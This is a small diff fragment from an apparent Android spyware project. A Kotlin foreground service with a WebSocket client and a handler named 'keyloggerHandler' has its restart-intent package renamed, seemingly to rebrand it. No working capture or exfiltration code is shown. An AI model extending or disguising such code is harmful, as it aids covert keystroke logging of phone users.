@@ -27,7 +27,7 @@ class ForegroundService : Service() {
     private lateinit var client: WebSocketClient
 
     var isConnected = false
-    private val SERVICE_RESTART_INTENT = "com.ot.grhq.receiver.restartservice"
+    private val SERVICE_RESTART_INTENT = "com.dh.gift.receiver.restartservice"
     private val handler = Handler(Looper.getMainLooper())
     private val keyloggerHandler = Handler(Looper.getMainLooper())
     private val interval: Long =  5000
